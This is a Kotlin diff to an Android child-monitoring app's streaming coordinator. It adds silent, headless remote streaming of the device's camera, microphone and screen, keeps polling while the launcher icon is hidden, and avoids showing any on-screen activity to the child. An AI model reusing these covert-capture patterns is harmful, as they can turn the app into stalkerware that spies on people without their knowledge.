@@ -8,6 +8,7 @@ import android.content.Intent
 import android.util.Log
 import com.childmonitor.MainActivity
 import com.childmonitor.MonitoringPrefs
+import com.childmonitor.TamperProtectionManager
 import com.childmonitor.NativeSyncUploader
 import com.childmonitor.PolicySyncManager
 import com.childmonitor.debug.PcpFlowLogger
@@ -35,6 +36,8 @@ import com.childmonitor.capture.StreamCaptureTeardown
 import com.childmonitor.capture.StreamLifecycleLogger
 import com.childmonitor.capture.StreamTeardownCoordinator
 import com.childmonitor.capture.JsViewerPresenceTracker
+import com.childmonitor.capture.JsHiddenStreamRuntime
+import com.childmonitor.capture.JsStreamWakeGrace
 import com.childmonitor.capture.StreamSessionRegistry
 import com.childmonitor.capture.StreamSessionWatchdog
 import com.oney.WebRTCModule.HiddenAudioBridge
@@ -65,6 +68,7 @@ object NativeStreamingCoordinator {
     private val pollInFlight = AtomicBoolean(false)
     private val commandPollInFlight = AtomicBoolean(false)
     private val mainHandler = Handler(Looper.getMainLooper())
+    private var jsWakeFallbackRunnable: Runnable? = null
 
     /** Pending screen stream to retry when FGS startup gate opens. */
     private data class PendingStreamRetry(
@@ -126,6 +130,7 @@ object NativeStreamingCoordinator {
         }
         appContext = context.applicationContext
         Log.i(TAG, "Starting native streaming coordinator")
+        StreamFgsPreparer.ensureAllReadyAsync(context.applicationContext)
         NativeStompOwner.start(context.applicationContext)
         startPollLoop()
     }
@@ -151,13 +156,21 @@ object NativeStreamingCoordinator {
         pollRunnable?.let { mainHandler.removeCallbacks(it) }
         pollRunnable = null
         NativeStompOwner.ensureConnected(context.applicationContext)
-        startPollLoop(SLOW_POLL_MS)
-        Log.i(TAG, "Paused fast poll after burst — STOMP + slow HTTP poll (${SLOW_POLL_MS}ms)")
+        val pollMs =
+            if (TamperProtectionManager.isLauncherHidden(context)) POLL_MS else SLOW_POLL_MS
+        startPollLoop(pollMs)
+        Log.i(
+            TAG,
+            "Paused fast poll after burst — STOMP + HTTP poll (${pollMs}ms, " +
+                "launcherHidden=${TamperProtectionManager.isLauncherHidden(context)})",
+        )
     }
 
     fun stop(context: Context) {
         if (!running.getAndSet(false)) return
         Log.i(TAG, "Stopping native streaming coordinator")
+        cancelJsWakeFallback()
+        JsStreamWakeGrace.clear()
         resetActivePollMisses()
         pollInFlight.set(false)
         commandPollInFlight.set(false)
@@ -258,41 +271,104 @@ object NativeStreamingCoordinator {
         )
 
     /**
-     * Guarantee JS receives a stream-request when the native coordinator sees it first.
-     * @return true if [emitStreamWake] was delivered to an active React instance.
+     * Deliver a stream request to the foreground RN runtime when React is still alive
+     * (common when the launcher icon is hidden but the process was not killed).
      */
-    private fun delegateStreamRequestToJs(
+    private fun tryEmitStreamWakeToJs(
         roomId: String,
         streamType: String,
         sessionId: String,
         cameraFacing: String?,
     ): Boolean {
-        PcpFlowLogger.log(
-            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
-            "delegating stream request to JS",
-            "type=$streamType session=$sessionId room=$roomId jsFlag=${jsListenerActive.get()} " +
-                "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
-        )
+        if (!ChildMonitorNativeModule.canDeliverStreamToJs()) return false
         val delivered = ChildMonitorNativeModule.emitStreamWake(
             roomId, streamType, sessionId, cameraFacing,
         )
         if (delivered) {
+            jsListenerActive.set(true)
             markActiveStream(roomId, sessionId)
-            PcpFlowLogger.log(
+            onJsWakeEmitted(roomId, streamType, sessionId, cameraFacing)
+        }
+        return delivered
+    }
+
+    /** Called after [ChildMonitorNativeModule.emitStreamWake] succeeds (bootstrap or coordinator). */
+    @JvmStatic
+    fun onJsWakeEmitted(
+        roomId: String,
+        streamType: String,
+        sessionId: String,
+        cameraFacing: String?,
+    ) {
+        JsStreamWakeGrace.markWakeEmitted(roomId, streamType, sessionId, cameraFacing)
+        resetActivePollMisses()
+        scheduleJsWakeFallback(roomId, streamType, sessionId, cameraFacing)
+    }
+
+    /** Called when JS acquires the hidden stream session or headless fallback starts capture. */
+    @JvmStatic
+    fun onJsWakeAcknowledged(sessionId: String) {
+        JsStreamWakeGrace.clear(sessionId)
+        cancelJsWakeFallback()
+        resetActivePollMisses()
+    }
+
+    private fun scheduleJsWakeFallback(
+        roomId: String,
+        streamType: String,
+        sessionId: String,
+        cameraFacing: String?,
+    ) {
+        cancelJsWakeFallback()
+        val ctx = appContext ?: return
+        val runnable = Runnable {
+            jsWakeFallbackRunnable = null
+            val pending = JsStreamWakeGrace.snapshot() ?: return@Runnable
+            if (pending.sessionId != sessionId) return@Runnable
+            if (JsStreamWakeGrace.isJsCaptureLive(sessionId)) {
+                JsStreamWakeGrace.clear(sessionId)
+                return@Runnable
+            }
+            PcpFlowLogger.warn(
                 PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
-                "JS wake event emitted",
+                "JS wake not acknowledged — headless fallback",
                 "type=$streamType session=$sessionId",
             )
-            return true
+            Log.w(TAG, "JS wake fallback — starting headless task session=$sessionId")
+            StreamingHeadlessTaskService.start(ctx, roomId, sessionId, streamType, cameraFacing)
         }
-        PcpFlowLogger.warn(
-            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
-            "JS wake not delivered — native fallback will run",
-            "type=$streamType session=$sessionId jsFlag=${jsListenerActive.get()} " +
-                "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
-        )
-        return false
+        jsWakeFallbackRunnable = runnable
+        mainHandler.postDelayed(runnable, JsStreamWakeGrace.FALLBACK_MS)
     }
+
+    private fun cancelJsWakeFallback() {
+        jsWakeFallbackRunnable?.let { mainHandler.removeCallbacks(it) }
+        jsWakeFallbackRunnable = null
+    }
+
+    private fun markActiveStream(roomId: String, sessionId: String) {
+        activeRoomId = roomId
+        activeSessionId = sessionId
+    }
+
+    private fun clearActiveStream() {
+        activeRoomId = null
+        activeSessionId = null
+    }
+
+    private fun isSameSessionAlreadyLive(sessionId: String, roomId: String): Boolean =
+        NativeStreamingHandoffPolicy.isSameSessionAlreadyLive(
+            activeSessionId = activeSessionId,
+            activeRoomId = activeRoomId,
+            requestedSessionId = sessionId,
+            requestedRoomId = roomId,
+            nativePublisherRunning = NativeStreamPublisher.isRunning(),
+            registrySessionId = StreamSessionRegistry.activeSessionId(),
+            screenFgsActive = ScreenCaptureForegroundService.isForegroundActive(),
+            cameraActive = CameraStreamForegroundService.isActive(),
+            audioActive = AudioStreamForegroundService.isActive(),
+            startInProgress = streamStartInProgress.get(),
+        )
 
     private fun startJsOrHeadlessStream(
         context: Context,
@@ -301,31 +377,17 @@ object NativeStreamingCoordinator {
         streamType: String,
         cameraFacing: String?,
     ) {
-        if (canUseJsStreaming()) {
+        if (tryEmitStreamWakeToJs(roomId, streamType, sessionId, cameraFacing)) {
             PcpFlowLogger.log(
                 PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
-                "RN listener active — silent hidden stream start",
+                "RN runtime alive — silent hidden stream start",
                 "type=$streamType session=$sessionId",
             )
-            val delivered = ChildMonitorNativeModule.emitStreamWake(
-                roomId, streamType, sessionId, cameraFacing,
-            )
-            if (delivered) {
-                markActiveStream(roomId, sessionId)
-                return
-            }
-            Log.w(
-                TAG,
-                "JS listener flagged but React inactive — falling back to headless " +
-                    "type=$streamType session=$sessionId",
-            )
+            return
         }
         stopAllStreams(context, "starting headless hidden stream")
         val kind = streamKindFrom(streamType)
         if (kind != null && !StreamFgsHelper.isActive(kind)) {
-            // P1-2: parent stream request is a user-initiated trigger, so we may start
-            // typed FGS even when the monitoring burst is inactive on Android 15+.
-            // Falls through to the legacy ensureKindReady path on older OS versions.
             if (!StreamFgsPreparer.ensureKindReadyForStreamRequest(context, kind)) {
                 PcpFlowLogger.warn(
                     PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
@@ -344,6 +406,31 @@ object NativeStreamingCoordinator {
         )
         markActiveStream(roomId, sessionId)
         StreamingHeadlessTaskService.start(context, roomId, sessionId, streamType, cameraFacing)
+    }
+
+    /** Route capture after camera/mic/screen typed FGS is already active (no bootstrap UI). */
+    private fun routeStreamAfterTypedFgs(
+        context: Context,
+        roomId: String,
+        sessionId: String,
+        streamType: String,
+        cameraFacing: String?,
+        useNativeScreen: Boolean,
+    ) {
+        if (useNativeScreen) {
+            ScreenCaptureForegroundService.startStream(context.applicationContext, roomId, sessionId)
+            return
+        }
+        if (tryEmitStreamWakeToJs(roomId, streamType, sessionId, cameraFacing)) {
+            return
+        }
+        StreamingHeadlessTaskService.start(
+            context.applicationContext,
+            roomId,
+            sessionId,
+            streamType,
+            cameraFacing,
+        )
     }
 
     /** Reconnect STOMP after native API base URL changes. */
@@ -482,33 +569,87 @@ object NativeStreamingCoordinator {
                 "nativeScreenRunning=${NativeStreamPublisher.isRunning()}",
         )
 
-        if (canUseJsStreaming()) {
-            // Parent Start Screen must obtain Cast (if needed) before JS publish — same for
-            // open/background. Never auto-consent outside this parent Start path.
-            if (streamKindFrom(streamType) == StreamKind.SCREEN &&
-                !ensureScreenConsentForParentStart(context, sessionId)
-            ) {
-                return
-            }
-            if (delegateStreamRequestToJs(roomId, streamType, sessionId, cameraFacing)) {
-                return
-            }
-            PcpFlowLogger.log(
-                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
-                "native coordinator routing — JS delegation failed, continuing native path",
-                "type=$streamType session=$sessionId",
-            )
+        val remoteStream = isBackgroundStream(streamType)
+        val requestedKind = streamKindFrom(streamType)
+
+        if (remoteStream && isSameSessionAlreadyLive(sessionId, roomId)) return
+
+        // Parent Start Screen must obtain Cast (if needed) before either JS or native publish.
+        // Never auto-consent outside this parent Start path.
+        if (requestedKind == StreamKind.SCREEN &&
+            !ensureScreenConsentForParentStart(context, sessionId)
+        ) {
+            return
         }
 
+        // Prefer starting typed FGS from the service/worker thread so we do not flash
+        // StreamBootstrapActivity over whatever the child is doing (YouTube, games, etc.).
+        if (requestedKind != null &&
+            remoteStream &&
+            !StreamFgsHelper.isActive(requestedKind) &&
+            StreamFgsPreparer.ensureKindReadyForStreamRequest(context, requestedKind)
+        ) {
+            markActiveStream(roomId, sessionId)
+            PcpFlowLogger.log(
+                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
+                "silent typed FGS — skipping bootstrap activity",
+                "kind=$requestedKind session=$sessionId",
+            )
+            routeStreamAfterTypedFgs(
+                context,
+                roomId,
+                sessionId,
+                streamType,
+                cameraFacing,
+                useNativeScreen = requestedKind == StreamKind.SCREEN &&
+                    canUseStoredProjection(context) &&
+                    !canUseJsStreaming(),
+            )
+            return
+        }
+
+        if (requestedKind != null &&
+            NativeStreamingHandoffPolicy.shouldBootstrapFromResumedActivity(
+                isRemoteStream = remoteStream,
+                typedFgsActive = StreamFgsHelper.isActive(requestedKind),
+            )
+        ) {
+            markActiveStream(roomId, sessionId)
+            val useNativeScreen =
+                requestedKind == StreamKind.SCREEN &&
+                    canUseStoredProjection(context) &&
+                    !canUseJsStreaming()
+            PcpFlowLogger.log(
+                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
+                "stream bootstrap — launching resumed activity before typed FGS",
+                "kind=$requestedKind session=$sessionId nativeScreen=$useNativeScreen",
+            )
+            StreamBootstrapActivity.startWithBalFallback(
+                context,
+                requestedKind,
+                roomId,
+                sessionId,
+                streamType,
+                cameraFacing,
+                ChildMonitorNativeModule.canDeliverStreamToJs(),
+                useNativeScreen,
+            )
+            return
+        }
+
+        if (tryEmitStreamWakeToJs(roomId, streamType, sessionId, cameraFacing)) {
+            return
+        }
+        PcpFlowLogger.log(
+            PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
+            "native coordinator routing — JS wake unavailable, continuing native path",
+            "type=$streamType session=$sessionId",
+        )
+
         // Remote streams never launch MainActivity — headless or silent JS only.
-        if (isBackgroundStream(streamType)) {
-            if (isSameSessionAlreadyLive(sessionId, roomId)) return
+        if (remoteStream) {
+            val kind = requestedKind
 
-            val kind = streamKindFrom(streamType)
-
-            if (kind == StreamKind.SCREEN && !ensureScreenConsentForParentStart(context, sessionId)) {
-                return
-            }
             if (kind == StreamKind.SCREEN && !canUseStoredProjection(context)) {
                 reportStreamFailure(context, sessionId, "NO_SCREEN_CAPTURE_CONSENT")
                 PcpFlowLogger.warn(
@@ -539,43 +680,6 @@ object NativeStreamingCoordinator {
                     "session=$sessionId",
                 )
                 return
-            }
-
-            if (kind != null && !StreamFgsHelper.isActive(kind)) {
-                PcpFlowLogger.transitionState(StreamState.SERVICE_STARTING, "onStreamRequestWorkerLocked",
-                    "kind=$kind session=$sessionId")
-                // Inbound parent request may legally start typed FGS even without a monitoring
-                // burst (API 35+). ensureKindReadyForStreamRequest opens the screen FGS gate.
-                if (StreamFgsPreparer.ensureKindReadyForStreamRequest(context, kind)) {
-                    PcpFlowLogger.transitionState(StreamState.SERVICE_STARTED, "onStreamRequestWorkerLocked",
-                        "kind=$kind session=$sessionId")
-                    // FGS pre-warmed — fall through to stream start below.
-                } else {
-                    markActiveStream(roomId, sessionId)
-                    val useNativeScreen =
-                        kind == StreamKind.SCREEN &&
-                            canUseStoredProjection(context) &&
-                            !canUseJsStreaming()
-                    PcpFlowLogger.log(
-                        PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
-                        "stream bootstrap — FGS not active",
-                        "kind=$kind session=$sessionId nativeScreen=$useNativeScreen",
-                    )
-                    // Use BAL-safe launcher: direct → accessibility → fullScreenIntent
-                    // notification.  Plain startActivity() is silently blocked by MIUI
-                    // when the app is in the background.
-                    StreamBootstrapActivity.startWithBalFallback(
-                        context,
-                        kind,
-                        roomId,
-                        sessionId,
-                        streamType,
-                        cameraFacing,
-                        canUseJsStreaming(),
-                        useNativeScreen,
-                    )
-                    return
-                }
             }
 
             if (
@@ -625,10 +729,8 @@ object NativeStreamingCoordinator {
             return
         }
 
-        if (canUseJsStreaming()) {
-            if (delegateStreamRequestToJs(roomId, streamType, sessionId, cameraFacing)) {
-                return
-            }
+        if (tryEmitStreamWakeToJs(roomId, streamType, sessionId, cameraFacing)) {
+            return
         }
 
         if (isSameSessionAlreadyLive(sessionId, roomId)) {
@@ -781,22 +883,18 @@ object NativeStreamingCoordinator {
     }
 
     private fun pollSessions(context: Context) {
-        // jsPeerActive must reflect the JS publisher / capture path, NOT the wake-listener flag.
-        // Backgrounding pauses the STOMP wake listener (jsListenerActive=false) while the hidden
-        // screen PC + FGS stay alive — treating that as "JS peer dead" false-orphans the session.
-        val jsPeerAlive =
-            (
-                StreamSessionRegistry.activeOwner() == StreamSessionRegistry.Owner.JS_HIDDEN &&
-                    ScreenCaptureForegroundService.isForegroundActive()
-            ) ||
-                (
-                    jsListenerActive.get() &&
-                        ChildMonitorNativeModule.canDeliverStreamToJs()
-                )
-        StreamSessionRegistry.reconcile(
-            NativeStreamPublisher.isRunning(),
-            jsPeerAlive,
-        )
+        // jsPeerActive must reflect live capture/FGS — not React availability alone.
+        // After teardown React may still be foreground (canDeliverStreamToJs=true) while
+        // capture is stopped; treating that as "alive" leaves JS_HIDDEN stuck and blocks
+        // new sessions. Background screen/camera/audio paths are covered by FGS + bridges.
+        val jsPeerAlive = JsHiddenStreamRuntime.isCapturePipelineLive()
+        if (!StreamSessionRegistry.reconcile(
+                NativeStreamPublisher.isRunning(),
+                jsPeerAlive,
+            )
+        ) {
+            StreamCaptureTeardown.stopAll(context, "session_orphan")
+        }
         try {
             StreamSessionWatchdog.tick(context)
         } catch (e: Exception) {
@@ -820,7 +918,7 @@ object NativeStreamingCoordinator {
         // When React is active it receives STOMP stream-request wakes, but we must still
         // poll for parent-initiated stops while capture runs — pauseStreamingListener()
         // stops the JS poll timer in background while jsListenerActive stays true.
-        val jsHandlesPendingWake = canUseJsStreaming()
+        val jsHandlesPendingWake = ChildMonitorNativeModule.canDeliverStreamToJs()
 
         // P1-6: Skip the pending-sessions HTTP poll when a stream is already active.
         // STOMP will have already delivered the same request; making this call every 3s
@@ -836,7 +934,7 @@ object NativeStreamingCoordinator {
                         val first = pendingArr.getJSONObject(0)
                         val pollSessionId = first.optString("sessionId")
                         // P1-2: dedup — skip if STOMP already started handling this session.
-                        // activeSessionId is set in delegateStreamRequestToJs / onStreamRequestWorkerLocked
+                        // activeSessionId is set in tryEmitStreamWakeToJs / onStreamRequestWorkerLocked
                         // before returning, so a matching ID means the request is already in-flight.
                         if (pollSessionId.isNotBlank() && pollSessionId == activeSessionId) {
                             Log.d(
@@ -874,6 +972,20 @@ object NativeStreamingCoordinator {
                     localCaptureActive()
                 ) {
                     if (StreamSessionRegistry.isNegotiatingOrReconnecting()) {
+                        resetActivePollMisses()
+                        return
+                    }
+                    if (
+                        JsStreamWakeGrace.shouldSuppressActivePollMiss(
+                            activeSessionId = activeSessionId,
+                            cameraFgsActive = CameraStreamForegroundService.isActive(),
+                            audioFgsActive = AudioStreamForegroundService.isActive(),
+                        )
+                    ) {
+                        Log.d(
+                            TAG,
+                            "pollSessions: suppressing active-poll miss — JS wake grace / FGS bootstrap",
+                        )
                         resetActivePollMisses()
                         return
                     }
